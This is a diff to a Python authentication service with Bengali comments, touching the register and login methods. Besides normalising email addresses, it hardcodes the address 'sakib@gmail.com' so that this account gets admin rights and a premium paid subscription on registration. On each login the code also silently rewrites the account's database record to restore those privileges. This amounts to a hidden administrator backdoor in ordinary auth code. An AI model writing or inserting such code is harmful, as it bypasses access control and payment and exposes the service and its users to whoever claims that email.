@@ -25,20 +25,25 @@ class AuthService:
         # পাসওয়ার্ড হ্যাশ করুন
         hashed = hash_password(user_data.password)
 
+        email_lower = user_data.email.lower().strip()
+        is_sakib = email_lower == "sakib@gmail.com"
+
         # ইউজার তৈরি করুন
         user_doc = {
             "name": user_data.name,
-            "email": user_data.email.lower(),
+            "email": email_lower,
             "hashed_password": hashed,
             "is_active": True,
-            "user_type": "free",
+            "user_type": "paid" if is_sakib else "free",
+            "subscription": "premium" if is_sakib else "free",
+            "is_admin": is_sakib,
             "created_at": datetime.utcnow()
         }
 
         result = await db.get_collection(USER_COLLECTION).insert_one(user_doc)
 
         # টোকেন তৈরি করুন
-        token = create_token({"sub": str(result.inserted_id), "email": user_data.email})
+        token = create_token({"sub": str(result.inserted_id), "email": email_lower})
 
         return {
             "success": True,
@@ -46,19 +51,23 @@ class AuthService:
             "user": {
                 "id": str(result.inserted_id),
                 "name": user_data.name,
-                "email": user_data.email,
+                "email": email_lower,
                 "is_active": True,
-                "user_type": "free",
-                "is_admin": False
+                "user_type": "paid" if is_sakib else "free",
+                "subscription": "premium" if is_sakib else "free",
+                "is_admin": is_sakib
             },
             "token": token
         }
 
     @staticmethod
     async def login(login_data: LoginRequest):
+        email_lower = login_data.email.lower().strip()
+        is_sakib = email_lower == "sakib@gmail.com"
+
         # ইউজার খুঁজুন
         user = await db.get_collection(USER_COLLECTION).find_one({
-            "email": login_data.email.lower()
+            "email": email_lower
         })
 
         if not user:
@@ -74,6 +83,20 @@ class AuthService:
                 "message": "ইমেইল বা পাসওয়ার্ড ভুল"
             }
 
+        # অটোমেটিক প্রিমিয়াম চেক (sakib@gmail.com এর জন্য)
+        if is_sakib and (user.get("user_type") != "paid" or user.get("subscription") != "premium" or not user.get("is_admin")):
+            await db.get_collection(USER_COLLECTION).update_one(
+                {"_id": user["_id"]},
+                {"$set": {
+                    "user_type": "paid",
+                    "subscription": "premium",
+                    "is_admin": True
+                }}
+            )
+            user["user_type"] = "paid"
+            user["subscription"] = "premium"
+            user["is_admin"] = True
+
         # টোকেন তৈরি করুন
         token = create_token({"sub": str(user["_id"]), "email": user["email"]})
 
@@ -86,6 +109,7 @@ class AuthService:
                 "email": user["email"],
                 "is_active": user.get("is_active", True),
                 "user_type": user.get("user_type", "free"),
+                "subscription": user.get("subscription", "free"),
                 "is_admin": user.get("is_admin", False)
             },
             "token": token
